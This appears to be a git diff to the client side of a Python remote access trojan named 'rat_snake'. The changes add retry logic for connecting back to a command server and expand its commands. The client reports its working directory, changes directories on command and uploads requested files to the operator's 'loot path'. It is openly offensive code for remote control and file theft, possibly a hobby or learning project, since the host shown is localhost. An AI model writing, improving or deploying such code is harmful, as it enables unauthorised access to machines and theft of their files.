@@ -8,13 +8,27 @@ import socket
 import os
 import subprocess
 import re
+import time
 
 HOST = "127.0.0.1"  # The server's hostname or IP address
 PORT = 1234  # The port used by the server
 ENCODING = 'utf-8'
+TIMEOUT = 30  # time in seconds to keep trying to connect to the server
 
+connected = False
+retry_count = 0
 with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-    s.connect((HOST, PORT))
+    while not connected:
+        try:
+            s.connect((HOST, PORT))
+            connected = True
+            break
+        except ConnectionError:
+            retry_count += 1
+            time.sleep(1)
+        if retry_count > TIMEOUT:
+            exit()
+
     # send current working directory
     working_directory = os.getcwd()
     s.sendall(working_directory.encode(ENCODING))
@@ -30,7 +44,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                 exit()
             # send file
             # rat_snake download
-            if command_to_run[10:18] == "download":
+            elif command_to_run[10:18] == "download":
                 filename = command_to_run[19:]
                 # strip all spaces
                 if os.path.exists(filename):
@@ -45,10 +59,10 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                         s.sendall(buffer)
                     response = "file transfer complete."
                 else:
-                    response = "file does not exist."
-            # unknown special command
+                    response = "file {0} does not exist.".format(filename)
+            # unknown special command or help
             else:
-                response = "unknown special command."
+                response = "unknown special command.\nquit - quits rat_snake and closes client\ndownload <FILE_NAME> - downloads file to loot path"
         # cd case (change directory and send back cwd)
         elif command_to_run[:2] == 'cd':
             try:
